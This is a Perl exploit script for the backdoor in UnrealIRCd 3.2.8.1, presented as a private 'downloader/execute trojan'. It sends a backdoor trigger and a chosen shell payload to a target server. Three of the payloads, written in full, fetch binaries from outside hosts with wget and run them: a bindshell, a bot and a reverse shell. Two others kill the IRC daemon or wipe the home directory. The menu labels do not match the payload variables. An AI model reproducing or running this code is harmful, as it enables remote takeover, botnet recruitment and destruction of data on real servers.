#!/usr/bin/perl
# Unreal3.2.8.1 Remote Downloader/Execute Trojan
# DO NOT DISTRIBUTE -PRIVATE-
# -iHaq (2l8)

use Socket;
use IO::Socket;

## Payload options
my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &';
my $payload2 = 'AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &';
my $payload3 = 'AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &';
my $payload4 = 'AB; killall ircd';
my $payload5 = 'AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *';

$host = "";
$port = "";
$type = "";
$host = @ARGV[0];
$port = @ARGV[1];
$type = @ARGV[2];

if ($host eq "") { usage(); }
if ($port eq "") { usage(); }
if ($type eq "") { usage(); }

sub usage {
  printf "\nUsage :\n";
  printf "perl unrealpwn.pl <host> <port> <type>\n\n";
  printf "Command list :\n";
  printf "[1] - Perl Bindshell\n";
  printf "[2] - Perl Reverse Shell\n";
  printf "[3] - Perl Bot\n";
  printf "-----------------------------\n";
  printf "[4] - shutdown ircserver\n";
  printf "[5] - delete ircserver\n";
  exit(1);
}

sub unreal_trojan {
  my $ircserv = $host;
  my $ircport = $port;
  my $sockd = IO::Socket::INET->new (PeerAddr => $ircserv, PeerPort => $ircport, Proto => "tcp") || die "Failed to connect to $ircserv on $ircport ...\n\n";
  print "[+] Payload sent ...\n";
  if ($type eq "1") {
    print $sockd "$payload1";
  } elsif ($type eq "2") {
    print $sockd "$payload2";
  } elsif ($type eq "3") {
    print $sockd "$payload3";
  } elsif ($type eq "4") {
    print $sockd "$payload4";
  } elsif ($type eq "5") {
    print $sockd "$payload5";
  } else {
    printf "\nInvalid Option ...\n\n";
    usage();
  }
  close($sockd);
  exit(1);
}

unreal_trojan();
# EOF